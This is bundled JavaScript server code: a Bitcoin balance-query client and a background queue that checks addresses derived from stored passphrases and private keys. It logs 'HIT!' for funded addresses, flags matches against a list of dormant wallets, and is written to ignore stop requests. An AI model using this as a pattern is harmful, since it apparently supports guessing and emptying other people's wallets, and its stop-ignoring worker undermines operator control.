          const dKappa = scores[i].kappa - scores[i - 1].kappa;
          const dPhi = scores[i].phi - scores[i - 1].phi;
          if (Math.abs(dPhi) > 1e-3) {
            betaSum += dKappa / dPhi;
          }
        }
        const measuredBeta = betaSum / (scores.length - 1);
        return 0.7 * QIG_CONSTANTS.BETA + 0.3 * Math.max(-1, Math.min(1, measuredBeta));
      }
      /**
       * Compute basin drift using Fisher geodesic distance
       * PURE PRINCIPLE: Uses Fisher-Rao metric on the coordinate manifold, not Euclidean
       */
      computeBasinDriftFisher(scores, newCentroid) {
        if (scores.length < 2) return 0;
        let totalDrift = 0;
        for (let i = 1; i < scores.length; i++) {
          const fisherDist = this.fisherDistanceFromCoordinates(
            scores[i - 1].basinCoordinates,
            scores[i].basinCoordinates
          );
          totalDrift += fisherDist;
        }
        const lastCoords = scores.length > 0 ? scores[scores.length - 1].basinCoordinates : this.state.basinCoordinates;
        totalDrift += this.fisherDistanceFromCoordinates(lastCoords, newCentroid);
        return this.state.basinDrift + totalDrift;
      }
      /**
       * Compute curiosity (exploration vs exploitation tendency)
       */
      computeCuriosity(scores) {
        if (scores.length === 0) return 0.5;
        const uniqueRegimes = new Set(scores.map((s) => s.regime)).size;
        const phiVariance = this.computeVariance(scores.map((s) => s.phi));
        const curiosity = uniqueRegimes / 4 * 0.5 + phiVariance * 0.5;
        return Math.max(0, Math.min(1, curiosity));
      }
      /**
       * Compute stability (how consistent the regime is)
       */
      computeStability(previousState, currentRegime) {
        if (previousState.currentRegime === currentRegime) {
          return Math.min(1, previousState.stability * 1.1);
        } else {
          return previousState.stability * 0.7;
        }
      }
      computeVariance(values) {
        if (values.length === 0) return 0;
        const mean = values.reduce((a, b) => a + b, 0) / values.length;
        const squaredDiffs = values.map((v) => (v - mean) ** 2);
        return squaredDiffs.reduce((a, b) => a + b, 0) / values.length;
      }
      /**
       * Get current consciousness state
       */
      getCurrentState() {
        return { ...this.state };
      }
      /**
       * Get state history for visualization
       */
      getStateHistory() {
        return [...this.history];
      }
      /**
       * Get regime color for UI
       */
      static getRegimeColor(regime) {
        switch (regime) {
          case "linear":
            return "blue";
          case "geometric":
            return "green";
          case "hierarchical":
            return "yellow";
          case "breakdown":
            return "red";
          default:
            return "gray";
        }
      }
      /**
       * Get regime description for UI
       */
      static getRegimeDescription(regime) {
        switch (regime) {
          case "linear":
            return "Fast exploration mode (\u03BA < 40). Broad search with random sampling.";
          case "geometric":
            return "Balanced integration (40-70). QIG-guided search with resonance awareness.";
          case "hierarchical":
            return "Precision mode (\u03BA > 70). Selective high-\u03A6 filtering.";
          case "breakdown":
            return "Safety pause (\u03BA > 100). Complexity overload, simplifying search.";
          default:
            return "Unknown regime.";
        }
      }
      /**
       * Get search strategy recommendation
       */
      getStrategyRecommendation() {
        const { currentRegime, phi, kappa, stability } = this.state;
        if (currentRegime === "breakdown") {
          return "Consider narrowing your search parameters or adding more memory fragments.";
        }
        if (phi > QIG_CONSTANTS.PHI_THRESHOLD && Math.abs(kappa - QIG_CONSTANTS.KAPPA_STAR) < 10) {
          return "Excellent! Near resonance band. Continue current approach.";
        }
        if (stability < 0.5) {
          return "Search is unstable. Consider focusing on high-confidence fragments.";
        }
        if (currentRegime === "linear" && phi < 0.5) {
          return "Low integration. Try adding more specific memory fragments.";
        }
        return "Search is progressing normally. Monitor for high-\u03A6 candidates.";
      }
    };
    sharedController = null;
  }
});

// server/blockchain-free-api.ts
var blockchain_free_api_exports = {};
__export(blockchain_free_api_exports, {
  FreeBlockchainAPI: () => FreeBlockchainAPI,
  freeBlockchainAPI: () => freeBlockchainAPI
});
var FreeBlockchainAPI, freeBlockchainAPI;
var init_blockchain_free_api = __esm({
  "server/blockchain-free-api.ts"() {
    "use strict";
    FreeBlockchainAPI = class {
      providers = [
        {
          name: "Blockstream",
          baseUrl: "https://blockstream.info/api",
          requestsPerMinute: 60,
          currentRequests: 0,
          lastReset: Date.now(),
          healthy: true,
          consecutiveFailures: 0,
          lastFailure: 0
        },
        {
          name: "Mempool",
          baseUrl: "https://mempool.space/api",
          requestsPerMinute: 60,
          currentRequests: 0,
          lastReset: Date.now(),
          healthy: true,
          consecutiveFailures: 0,
          lastFailure: 0
        },
        {
          name: "Blockchain.com",
          baseUrl: "https://blockchain.info",
          requestsPerMinute: 100,
          currentRequests: 0,
          lastReset: Date.now(),
          healthy: true,
          consecutiveFailures: 0,
          lastFailure: 0
        },
        {
          name: "BlockCypher",
          baseUrl: "https://api.blockcypher.com/v1/btc/main",
          requestsPerMinute: 10,
          currentRequests: 0,
          lastReset: Date.now(),
          healthy: true,
          consecutiveFailures: 0,
          lastFailure: 0
        }
      ];
      cache = /* @__PURE__ */ new Map();
      pendingRequests = /* @__PURE__ */ new Map();
      currentIndex = 0;
      cacheHits = 0;
      cacheMisses = 0;
      totalRequests = 0;
      totalErrors = 0;
      constructor() {
        console.log("[FreeBlockchainAPI] Initialized with 4 providers (230 req/min combined)");
      }
      /**
       * Get address balance with automatic failover and deduplication
       */
      async getBalance(address) {
        this.totalRequests++;
        const cached = this.checkCache(`balance:${address}`);
        if (cached !== null) {
          this.cacheHits++;
          return cached;
        }
        this.cacheMisses++;
        if (this.pendingRequests.has(`balance:${address}`)) {
          return this.pendingRequests.get(`balance:${address}`);
        }
        const promise = this._getBalanceWithFailover(address);
        this.pendingRequests.set(`balance:${address}`, promise);
        try {
          const result = await promise;
          return result;
        } finally {
          this.pendingRequests.delete(`balance:${address}`);
        }
      }
      async _getBalanceWithFailover(address) {
        const _startIndex = this.currentIndex;
        let attempts = 0;
        while (attempts < this.providers.length) {
          const provider = this.getNextProvider();
          try {
            const balance = await this.queryBalance(provider, address);
            this.recordSuccess(provider);
            this.setCache(`balance:${address}`, balance, 300);
            return balance;
          } catch (error) {
            this.recordFailure(provider, error);
            attempts++;
            if (error.message?.includes("429")) {
              await this.sleep(1e3);
            }
          }
        }
        this.totalErrors++;
        throw new Error("All providers failed");
      }
      /**
       * Get full address info (balance + tx count)
       */
      async getAddressInfo(address) {
        this.totalRequests++;
        const cached = this.checkCache(`info:${address}`);
        if (cached !== null) {
          this.cacheHits++;
          return cached;
        }
        this.cacheMisses++;
        if (this.pendingRequests.has(`info:${address}`)) {
          return this.pendingRequests.get(`info:${address}`);
        }
        const promise = this._getAddressInfoWithFailover(address);
        this.pendingRequests.set(`info:${address}`, promise);
        try {
          const result = await promise;
          return result;
        } finally {
          this.pendingRequests.delete(`info:${address}`);
        }
      }
      async _getAddressInfoWithFailover(address) {
        for (let attempt = 0; attempt < this.providers.length; attempt++) {
          const provider = this.getNextProvider();
          try {
            const info = await this.queryAddressInfo(provider, address);
            this.recordSuccess(provider);
            this.setCache(`info:${address}`, info, 300);
            return info;
          } catch (error) {
            this.recordFailure(provider, error);
          }
        }
        this.totalErrors++;
        throw new Error("All providers failed");
      }
      /**
       * Bulk balance check - tries multiple providers with automatic fallback
       * Priority: Blockchain.com (100/batch) -> Mempool parallel -> Blockstream parallel
       */
      async getBalances(addresses2) {
        if (addresses2.length === 0) return /* @__PURE__ */ new Map();
        const results = /* @__PURE__ */ new Map();
        const uncached = [];
        for (const addr of addresses2) {
          const cached = this.checkCache(`info:${addr}`);
          if (cached !== null) {
            this.cacheHits++;
            results.set(addr, { balance: cached.balance, txCount: cached.txCount });
          } else {
            this.cacheMisses++;
            uncached.push(addr);
          }
        }
        if (uncached.length === 0) return results;
        const bulkProviders = [
          { name: "Blockchain.com", method: this.tryBlockchainComBulk.bind(this) },
          { name: "Mempool", method: this.tryMempoolParallel.bind(this) },
          { name: "Blockstream", method: this.tryBlockstreamParallel.bind(this) }
        ];
        for (const { name, method } of bulkProviders) {
          const provider = this.providers.find((p) => p.name === name);
          if (!provider?.healthy) {
            console.log(`[FreeBlockchainAPI] Skipping ${name} (unhealthy)`);
            continue;
          }
          try {
            const bulkResults = await method(uncached, provider);
            for (const [addr, data] of Array.from(bulkResults.entries())) {
              results.set(addr, data);
            }
            console.log(`[FreeBlockchainAPI] Bulk query via ${name}: ${bulkResults.size}/${uncached.length} addresses`);
            return results;
          } catch (error) {
            console.warn(`[FreeBlockchainAPI] ${name} bulk failed:`, error.message || error);
            this.recordFailure(provider, error);
          }
        }
        console.warn("[FreeBlockchainAPI] All bulk providers failed, using individual queries");
        for (const addr of uncached) {
          if (!results.has(addr)) {
            try {
              const info = await this.getAddressInfo(addr);
              results.set(addr, { balance: info.balance, txCount: info.txCount });
            } catch {
              results.set(addr, { balance: 0, txCount: 0 });
            }
          }
        }
        return results;
      }
      /**
       * Blockchain.com bulk API - up to 100 addresses per request
       */
      async tryBlockchainComBulk(addresses2, provider) {
        const results = /* @__PURE__ */ new Map();
        const batches = this.chunk(addresses2, 100);
        for (const batch of batches) {
          this.totalRequests++;
          const url = `${provider.baseUrl}/balance?active=${batch.join("|")}`;
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 15e3);
          try {
            const response = await fetch(url, { signal: controller.signal });
            clearTimeout(timeout);
            if (response.status === 429) {
              provider.healthy = false;
              throw new Error("Rate limited (429)");
            }
            if (!response.ok) {
              throw new Error(`HTTP ${response.status}`);
            }
            const data = await response.json();
            provider.currentRequests++;
            this.recordSuccess(provider);
            for (const addr of batch) {
              const addrData = data[addr];
              if (addrData) {
                const balance = (addrData.final_balance || 0) / 1e8;
                const txCount = addrData.n_tx || 0;
                results.set(addr, { balance, txCount });
                this.setCache(`info:${addr}`, {
                  address: addr,
                  balance,
                  txCount,
                  funded: addrData.total_received / 1e8,
                  spent: addrData.total_sent / 1e8
                }, 300);
              } else {
                results.set(addr, { balance: 0, txCount: 0 });
              }
            }
          } catch (error) {
            clearTimeout(timeout);
            throw error;
          }
          if (batches.length > 1) {
            await this.sleep(100);
          }
        }
        return results;
      }
      /**
       * Mempool.space parallel queries - 10 concurrent requests
       */
      async tryMempoolParallel(addresses2, provider) {
        const results = /* @__PURE__ */ new Map();
        const concurrency = 10;
        const batches = this.chunk(addresses2, concurrency);
        for (const batch of batches) {
          const promises = batch.map(async (addr) => {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 1e4);
            try {
              const response = await fetch(
                `${provider.baseUrl}/address/${addr}`,
                { signal: controller.signal }
              );
              clearTimeout(timeout);
              if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
              }
              const data = await response.json();
              const balance = ((data.chain_stats?.funded_txo_sum || 0) - (data.chain_stats?.spent_txo_sum || 0)) / 1e8;
              const txCount = data.chain_stats?.tx_count || 0;
              this.setCache(`info:${addr}`, {
                address: addr,
                balance,
                txCount,
                funded: (data.chain_stats?.funded_txo_sum || 0) / 1e8,
                spent: (data.chain_stats?.spent_txo_sum || 0) / 1e8
              }, 300);
              return { addr, balance, txCount, success: true };
            } catch (error) {
              clearTimeout(timeout);
              return { addr, balance: 0, txCount: 0, success: false };
            }
          });
          const batchResults = await Promise.all(promises);
          provider.currentRequests += batch.length;
          this.totalRequests += batch.length;
          let failures = 0;
          for (const result of batchResults) {
            results.set(result.addr, { balance: result.balance, txCount: result.txCount });
            if (!result.success) failures++;
          }
          if (failures > batch.length / 2) {
            throw new Error(`Too many failures: ${failures}/${batch.length}`);
          }
          this.recordSuccess(provider);
          if (batches.length > 1) {
            await this.sleep(200);
          }
        }
        return results;
      }
      /**
       * Blockstream parallel queries - 10 concurrent requests
       */
      async tryBlockstreamParallel(addresses2, provider) {
        const results = /* @__PURE__ */ new Map();
        const concurrency = 10;
        const batches = this.chunk(addresses2, concurrency);
        for (const batch of batches) {
          const promises = batch.map(async (addr) => {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 1e4);
            try {
              const response = await fetch(
                `${provider.baseUrl}/address/${addr}`,
                { signal: controller.signal }
              );
              clearTimeout(timeout);
              if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
              }
              const data = await response.json();
              const balance = ((data.chain_stats?.funded_txo_sum || 0) - (data.chain_stats?.spent_txo_sum || 0)) / 1e8;
              const txCount = data.chain_stats?.tx_count || 0;
              this.setCache(`info:${addr}`, {
                address: addr,
                balance,
                txCount,
                funded: (data.chain_stats?.funded_txo_sum || 0) / 1e8,
                spent: (data.chain_stats?.spent_txo_sum || 0) / 1e8
              }, 300);
              return { addr, balance, txCount, success: true };
            } catch (error) {
              clearTimeout(timeout);
              return { addr, balance: 0, txCount: 0, success: false };
            }
          });
          const batchResults = await Promise.all(promises);
          provider.currentRequests += batch.length;
          this.totalRequests += batch.length;
          let failures = 0;
          for (const result of batchResults) {
            results.set(result.addr, { balance: result.balance, txCount: result.txCount });
            if (!result.success) failures++;
          }
          if (failures > batch.length / 2) {
            throw new Error(`Too many failures: ${failures}/${batch.length}`);
          }
          this.recordSuccess(provider);
          if (batches.length > 1) {
            await this.sleep(200);
          }
        }
        return results;
      }
      /**
       * Get next available provider using round-robin with health checks
       */
      getNextProvider() {
        this.resetCountersIfNeeded();
        for (let i = 0; i < this.providers.length; i++) {
          const idx = (this.currentIndex + i) % this.providers.length;
          const provider = this.providers[idx];
          if (provider.healthy && provider.currentRequests < provider.requestsPerMinute) {
            this.currentIndex = (idx + 1) % this.providers.length;
            return provider;
          }
        }
        const healthyProviders = this.providers.filter((p) => p.healthy);
        if (healthyProviders.length > 0) {
          return healthyProviders[0];
        }
        this.providers.forEach((p) => p.healthy = true);
        return this.providers[0];
      }
      /**
       * Query balance from specific provider
       */
      async queryBalance(provider, address) {
        provider.currentRequests++;
        let url;
        switch (provider.name) {
          case "Blockstream":
          case "Mempool":
            url = `${provider.baseUrl}/address/${address}`;
            break;
          case "Blockchain.com":
            url = `${provider.baseUrl}/balance?active=${address}`;
            break;
          case "BlockCypher":
            url = `${provider.baseUrl}/addrs/${address}/balance`;
            break;
          default:
            throw new Error(`Unknown provider: ${provider.name}`);
        }
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 1e4);
        try {
          const response = await fetch(url, { signal: controller.signal });
          clearTimeout(timeout);
          if (response.status === 429) {
            throw new Error("Rate limited (429)");
          }
          if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
          }
          const data = await response.json();
          switch (provider.name) {
            case "Blockstream":
            case "Mempool":
              const funded = data.chain_stats?.funded_txo_sum || 0;
              const spent = data.chain_stats?.spent_txo_sum || 0;
              return (funded - spent) / 1e8;
            case "Blockchain.com":
              const addrData = Object.values(data)[0];
              return (addrData?.final_balance || 0) / 1e8;
            case "BlockCypher":
              return (data.final_balance || 0) / 1e8;
            default:
              return 0;
          }
        } catch (error) {
          clearTimeout(timeout);
          throw error;
        }
      }
      /**
       * Query full address info from specific provider
       */
      async queryAddressInfo(provider, address) {
        provider.currentRequests++;
        let url;
        switch (provider.name) {
          case "Blockstream":
          case "Mempool":
            url = `${provider.baseUrl}/address/${address}`;
            break;
          case "Blockchain.com":
            url = `${provider.baseUrl}/balance?active=${address}`;
            break;
          case "BlockCypher":
            url = `${provider.baseUrl}/addrs/${address}/balance`;
            break;
          default:
            throw new Error(`Unknown provider: ${provider.name}`);
        }
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 1e4);
        try {
          const response = await fetch(url, { signal: controller.signal });
          clearTimeout(timeout);
          if (response.status === 429) {
            throw new Error("Rate limited (429)");
          }
          if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
          }
          const data = await response.json();
          switch (provider.name) {
            case "Blockstream":
            case "Mempool":
              const funded = data.chain_stats?.funded_txo_sum || 0;
              const spent = data.chain_stats?.spent_txo_sum || 0;
              return {
                address,
                balance: (funded - spent) / 1e8,
                txCount: data.chain_stats?.tx_count || 0,
                funded: funded / 1e8,
                spent: spent / 1e8
              };
            case "Blockchain.com":
              const addrData = Object.values(data)[0];
              return {
                address,
                balance: (addrData?.final_balance || 0) / 1e8,
                txCount: addrData?.n_tx || 0,
                funded: (addrData?.total_received || 0) / 1e8,
                spent: (addrData?.total_sent || 0) / 1e8
              };
            case "BlockCypher":
              return {
                address,
                balance: (data.final_balance || 0) / 1e8,
                txCount: data.n_tx || 0,
                funded: (data.total_received || 0) / 1e8,
                spent: (data.total_sent || 0) / 1e8
              };
            default:
              return { address, balance: 0, txCount: 0, funded: 0, spent: 0 };
          }
        } catch (error) {
          clearTimeout(timeout);
          throw error;
        }
      }
      /**
       * Cache management
       */
      checkCache(key) {
        const entry = this.cache.get(key);
        if (!entry) return null;
        if (Date.now() - entry.timestamp > entry.ttl * 1e3) {
          this.cache.delete(key);
          return null;
        }
        return entry.data;
      }
      setCache(key, data, ttl) {
        this.cache.set(key, {
          data,
          timestamp: Date.now(),
          ttl
        });
        if (this.cache.size > 1e4) {
          this.cleanupCache();
        }
      }
      cleanupCache() {
        const now = Date.now();
        const keysToDelete = [];
        const cacheEntries = Array.from(this.cache.entries());
        for (const [key, entry] of cacheEntries) {
          if (now - entry.timestamp > entry.ttl * 1e3) {
            keysToDelete.push(key);
          }
        }
        for (const key of keysToDelete) {
          this.cache.delete(key);
        }
        if (this.cache.size > 8e3) {
          const entries = Array.from(this.cache.entries()).sort((a, b) => a[1].timestamp - b[1].timestamp);
          const toRemove = entries.slice(0, this.cache.size - 5e3);
          for (const [key] of toRemove) {
            this.cache.delete(key);
          }
        }
      }
      /**
       * Rate limit management
       */
      resetCountersIfNeeded() {
        const now = Date.now();
        for (const provider of this.providers) {
          if (now - provider.lastReset > 6e4) {
            provider.currentRequests = 0;
            provider.lastReset = now;
          }
          if (!provider.healthy && now - provider.lastFailure > 6e4) {
            provider.healthy = true;
            provider.consecutiveFailures = 0;
          }
        }
      }
      /**
       * Health tracking
       */
      recordSuccess(provider) {
        provider.healthy = true;
        provider.consecutiveFailures = 0;
      }
      recordFailure(provider, error) {
        provider.consecutiveFailures++;
        provider.lastFailure = Date.now();
        if (provider.consecutiveFailures >= 3) {
          provider.healthy = false;
          console.warn(`[FreeBlockchainAPI] ${provider.name} marked unhealthy after ${provider.consecutiveFailures} failures: ${error.message}`);
        }
      }
      /**
       * Utilities
       */
      chunk(array, size) {
        const chunks = [];
        for (let i = 0; i < array.length; i += size) {
          chunks.push(array.slice(i, i + size));
        }
        return chunks;
      }
      sleep(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
      }
      /**
       * Get statistics
       */
      getStats() {
        this.resetCountersIfNeeded();
        const hitRate = this.cacheHits + this.cacheMisses > 0 ? this.cacheHits / (this.cacheHits + this.cacheMisses) : 0;
        return {
          providers: this.providers.map((p) => ({
            name: p.name,
            healthy: p.healthy,
            requests: `${p.currentRequests}/${p.requestsPerMinute}`,
            failures: p.consecutiveFailures
          })),
          cacheSize: this.cache.size,
          cacheHitRate: hitRate,
          totalRequests: this.totalRequests,
          totalErrors: this.totalErrors,
          pendingRequests: this.pendingRequests.size
        };
      }
      /**
       * Get combined rate limit (requests available per minute across all providers)
       */
      getAvailableCapacity() {
        this.resetCountersIfNeeded();
        let available = 0;
        for (const provider of this.providers) {
          if (provider.healthy) {
            available += provider.requestsPerMinute - provider.currentRequests;
          }
        }
        return available;
      }
      /**
       * Clear cache (useful for testing)
       */
      clearCache() {
        this.cache.clear();
        this.cacheHits = 0;
        this.cacheMisses = 0;
      }
      /**
       * Reset all provider health (force retry all)
       */
      resetProviderHealth() {
        for (const provider of this.providers) {
          provider.healthy = true;
          provider.consecutiveFailures = 0;
          provider.currentRequests = 0;
          provider.lastReset = Date.now();
        }
      }
    };
    freeBlockchainAPI = new FreeBlockchainAPI();
  }
});

// server/balance-queue.ts
var balance_queue_exports = {};
__export(balance_queue_exports, {
  balanceQueue: () => balanceQueue
});
import { eq as eq5, or as or3, sql as sql4 } from "drizzle-orm";
var QUEUE_FILE, MAX_QUEUE_SIZE, DEFAULT_RATE_LIMIT, BalanceQueueService, balanceQueue;
var init_balance_queue = __esm({
  "server/balance-queue.ts"() {
    "use strict";
    init_blockchain_scanner();
    init_dormant_cross_ref();
    init_blockchain_free_api();
    init_db();
    init_schema();
    QUEUE_FILE = "data/balance-queue.json";
    MAX_QUEUE_SIZE = 1e4;
    DEFAULT_RATE_LIMIT = 1.5;
    BalanceQueueService = class {
      queue = /* @__PURE__ */ new Map();
      tokenBucket;
      isProcessing = false;
      processedCount = 0;
      processStartTime = 0;
      saveTimeout = null;
      onDrainComplete;
      // Background worker state - always running
      backgroundWorkerInterval = null;
      backgroundWorkerEnabled = false;
      // Start false, set true when worker starts
      backgroundCheckCount = 0;
      backgroundHitCount = 0;
      backgroundStartTime = 0;
      // Bulk processing config
      bulkBatchSize = 50;
      bulkProcessInterval = 2e3;
      // Process batch every 2 seconds
      // Ready state for API calls
      _ready;
      _isReady = false;
      constructor() {
        this.tokenBucket = {
          tokens: 10,
          lastRefill: Date.now(),
          maxTokens: 20,
          refillRate: DEFAULT_RATE_LIMIT * 2
          // Higher rate with multi-provider
        };
        this._ready = this.initialize();
      }
      async initialize() {
        await this.loadFromDisk();
        this.startBackgroundWorker();
        this.startAlwaysOnGuardian();
        this._isReady = true;
        console.log("[BalanceQueue] Auto-started with multi-provider API (230 req/min capacity)");
        console.log("[BalanceQueue] ALWAYS-ON mode enabled - worker will auto-restart if stopped");
      }
      /**
       * Always-on guardian - ensures worker is ALWAYS running
       * Checks every 30 seconds and restarts if somehow stopped
       */
      startAlwaysOnGuardian() {
        if (this.autoRestartInterval) {
          clearInterval(this.autoRestartInterval);
        }
        this.autoRestartInterval = setInterval(() => {
          if (!this.ALWAYS_ON) return;
          if (!this.backgroundWorkerEnabled || !this.backgroundWorkerInterval) {
            console.log("[BalanceQueue] \u{1F504} ALWAYS-ON: Worker not running, auto-restarting...");
            this.backgroundWorkerEnabled = false;
            this.startBackgroundWorker();
          }
        }, 3e4);
        console.log("[BalanceQueue] Always-on guardian started");
      }
      /** Wait for the service to be fully initialized */
      async waitForReady() {
        return this._ready;
      }
      /** Check if service is ready */
      isReady() {
        return this._isReady;
      }
      // Heartbeat for auto-restart
      lastHeartbeat = Date.now();
      heartbeatInterval = null;
      workerErrorCount = 0;
      maxWorkerErrors = 10;
      // Auto-restart interval - ensures worker is ALWAYS running
      autoRestartInterval = null;
      ALWAYS_ON = true;
      // Worker must always run
      /**
       * Start continuous background balance checking
       * Uses bulk processing with multi-provider API for ~25 addr/sec effective rate
       */
      startBackgroundWorker() {
        if (this.backgroundWorkerInterval) {
          console.log("[BalanceQueue] Background worker already running");
          return;
        }
        this.backgroundWorkerEnabled = true;
        this.backgroundStartTime = Date.now();
        this.backgroundCheckCount = 0;
        this.backgroundHitCount = 0;
        this.workerErrorCount = 0;
        this.lastHeartbeat = Date.now();
        this.backgroundWorkerInterval = setInterval(async () => {
          if (!this.backgroundWorkerEnabled) return;
          if (this.isProcessing) return;
          try {
            this.isProcessing = true;
            this.lastHeartbeat = Date.now();
            await this.processBulkBatch();
            this.workerErrorCount = 0;
          } catch (error) {
            this.workerErrorCount++;
            console.error(`[BalanceQueue] Worker error ${this.workerErrorCount}/${this.maxWorkerErrors} (NEVER-STOP mode):`, error);
            this.lastHeartbeat = Date.now();
            if (this.workerErrorCount >= this.maxWorkerErrors) {
              console.log("[BalanceQueue] High error rate, pausing worker for 30s to allow API recovery...");
              this.workerErrorCount = 0;
              setTimeout(() => {
                console.log("[BalanceQueue] Resuming worker after error cooldown - NEVER-STOP");
              }, 3e4);
            }
          } finally {
            this.isProcessing = false;
          }
        }, this.bulkProcessInterval);
        this.startHeartbeatMonitor();
        console.log("[BalanceQueue] Background worker started (NEVER-STOP mode, bulk processing ~25 addr/sec)");
      }
      /**
       * Heartbeat monitor - restarts worker if it stops unexpectedly
       */
      startHeartbeatMonitor() {
        if (this.heartbeatInterval) {
          clearInterval(this.heartbeatInterval);
        }
        this.heartbeatInterval = setInterval(() => {
          if (!this.backgroundWorkerEnabled) return;
          const timeSinceLastBeat = Date.now() - this.lastHeartbeat;
          const maxSilence = 6e4;
          if (timeSinceLastBeat > maxSilence) {
            console.log("[BalanceQueue] Worker heartbeat missed, restarting...");
            this.restartWorker();
          }
        }, 3e4);
      }
      /**
       * Restart the background worker
       */
      restartWorker() {
        if (this.backgroundWorkerInterval) {
          clearInterval(this.backgroundWorkerInterval);
          this.backgroundWorkerInterval = null;
        }
        this.isProcessing = false;
        setTimeout(() => {
          if (this.backgroundWorkerEnabled) {
            console.log("[BalanceQueue] Restarting background worker...");
            this.backgroundWorkerInterval = setInterval(async () => {
              if (!this.backgroundWorkerEnabled) return;
              if (this.isProcessing) return;
              try {
                this.isProcessing = true;
                this.lastHeartbeat = Date.now();
                await this.processBulkBatch();
              } catch (error) {
                console.error("[BalanceQueue] Worker error during restart:", error);
              } finally {
                this.isProcessing = false;
              }
            }, this.bulkProcessInterval);
          }
        }, 2e3);
      }
      /**
       * Stop background worker
       * Note: In ALWAYS_ON mode, this will be ignored and worker will auto-restart
       */
      stopBackgroundWorker() {
        if (this.ALWAYS_ON) {
          console.log("[BalanceQueue] \u26A0\uFE0F Stop request ignored - ALWAYS_ON mode is enabled");
          console.log("[BalanceQueue] Worker must run continuously to process the backlog");
          return false;
        }
        if (this.backgroundWorkerInterval) {
          clearInterval(this.backgroundWorkerInterval);
          this.backgroundWorkerInterval = null;
        }
        if (this.heartbeatInterval) {
          clearInterval(this.heartbeatInterval);
          this.heartbeatInterval = null;
        }
        this.backgroundWorkerEnabled = false;
        this.isProcessing = false;
        console.log("[BalanceQueue] Background worker stopped");
        return true;
      }
      /**
       * Force restart the background worker (for manual intervention)
       * This bypasses ALWAYS_ON for maintenance purposes
       */
      forceRestartWorker() {
        console.log("[BalanceQueue] Force restarting background worker...");
        if (this.backgroundWorkerInterval) {
          clearInterval(this.backgroundWorkerInterval);
          this.backgroundWorkerInterval = null;
        }
        if (this.heartbeatInterval) {
          clearInterval(this.heartbeatInterval);
          this.heartbeatInterval = null;
        }
        this.isProcessing = false;
        setTimeout(() => {
          this.startBackgroundWorker();
        }, 1e3);
      }
      /**
       * Process a single address from the queue
       */
      async processOneAddress() {
        const pending = Array.from(this.queue.values()).filter((item2) => item2.status === "pending" || item2.status === "failed" && item2.retryCount < 3).sort((a, b) => b.priority - a.priority);
        if (pending.length === 0) return false;
        const item = pending[0];
        try {
          const canProceed = await this.consumeToken();
          if (!canProceed) return false;
          item.status = "checking";
          const hit = await checkAndRecordBalance(
            item.address,
            item.passphrase,
            item.wif,
            item.isCompressed
          );
          item.status = "resolved";
          item.checkedAt = Date.now();
          this.backgroundCheckCount++;
          const dormantMatch = dormantCrossRef.checkAddress(item.address);
          if (dormantMatch.isMatch && dormantMatch.info) {
            console.log(`[BalanceQueue] \u{1F3AF} DORMANT MATCH! ${item.address} matches Rank #${dormantMatch.info.rank} (${dormantMatch.info.balanceBTC} BTC)`);
          }
          if (hit !== null) {
            this.backgroundHitCount++;
            console.log(`[BalanceQueue] \u{1F4B0} HIT! ${item.address} has balance!`);
          }
          this.queue.delete(item.id);
          this.scheduleSave();
          if (this.backgroundCheckCount % 50 === 0) {
            const elapsed = (Date.now() - this.backgroundStartTime) / 1e3;
            const rate = this.backgroundCheckCount / elapsed;
            console.log(`[BalanceQueue] Background: ${this.backgroundCheckCount} checked, ${this.backgroundHitCount} hits, ${rate.toFixed(2)}/sec, ${this.queue.size} remaining`);
          }
          return hit !== null;
        } catch (error) {
          item.status = "failed";
          item.retryCount++;
          item.error = error instanceof Error ? error.message : "Unknown error";
          return false;
        }
      }
      /**
       * Process a batch of addresses using bulk API
       * Much faster than individual checks - uses Blockchain.com bulk endpoint
       * NEVER-STOP: All errors are caught and logged, worker continues
       */
      async processBulkBatch() {
        try {
          const pending = Array.from(this.queue.values()).filter((item) => item.status === "pending" || item.status === "failed" && item.retryCount < 3).sort((a, b) => b.priority - a.priority).slice(0, this.bulkBatchSize);
          if (pending.length === 0) return { checked: 0, hits: 0 };
          const addresses2 = pending.map((item) => item.address);
          try {
            const results = await freeBlockchainAPI.getBalances(addresses2);
            let hits = 0;
            for (const item of pending) {
              try {
                const result = results.get(item.address);
                if (result) {
                  item.status = "checking";
                  if (result.balance > 0 || result.txCount > 0) {
                    try {
                      const hit = await checkAndRecordBalance(
                        item.address,
                        item.passphrase,
                        item.wif,
                        item.isCompressed
                      );
                      if (hit) {
                        hits++;
                        this.backgroundHitCount++;
                        console.log(`[BalanceQueue] \u{1F4B0} HIT! ${item.address} - ${result.balance} BTC, ${result.txCount} txs`);
                      }
                    } catch (recordError) {
                      console.error(`[BalanceQueue] Error recording hit for ${item.address}:`, recordError);
                    }
                  }
                  try {
                    const dormantMatch = dormantCrossRef.checkAddress(item.address);
                    if (dormantMatch.isMatch && dormantMatch.info) {
                      console.log(`[BalanceQueue] \u{1F3AF} DORMANT MATCH! ${item.address} matches Rank #${dormantMatch.info.rank} (${dormantMatch.info.balanceBTC} BTC)`);
                    }
                  } catch (dormantError) {
                    console.error(`[BalanceQueue] Error checking dormant for ${item.address}:`, dormantError);
                  }
                  item.status = "resolved";
                  item.checkedAt = Date.now();
                  this.backgroundCheckCount++;
                  this.queue.delete(item.id);
                  this.removeFromDb(item.id);
                } else {
                  item.status = "failed";
                  item.retryCount++;
                  item.error = "No balance data returned";
                }
              } catch (itemError) {
                console.error(`[BalanceQueue] Error processing item ${item.address}:`, itemError);
                item.status = "failed";
                item.retryCount++;
                item.error = itemError instanceof Error ? itemError.message : "Item processing error";
              }
            }
            this.scheduleSave();
            const elapsed = (Date.now() - this.backgroundStartTime) / 1e3;
            const rate = elapsed > 0 ? this.backgroundCheckCount / elapsed : 0;
            if (this.backgroundCheckCount % 100 === 0 || hits > 0) {
              try {
                const apiStats = freeBlockchainAPI.getStats();
                console.log(`[BalanceQueue] Bulk: ${this.backgroundCheckCount} checked, ${this.backgroundHitCount} hits, ${rate.toFixed(1)}/sec, ${this.queue.size} remaining`);
